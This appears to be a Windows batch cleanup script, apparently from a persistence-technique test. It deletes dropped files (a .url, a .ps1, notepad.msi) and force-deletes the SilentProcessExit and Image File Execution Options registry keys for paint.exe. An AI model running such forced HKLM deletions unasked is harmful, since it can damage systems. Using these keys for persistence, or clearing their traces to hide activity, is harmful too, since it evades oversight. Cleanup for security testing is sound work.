start "" cmd /c del C:\windows\temp\url.url
start "" cmd /c del Default_File_Path2.ps1
start "" cmd /c del notepad.msi
start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /f
start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /f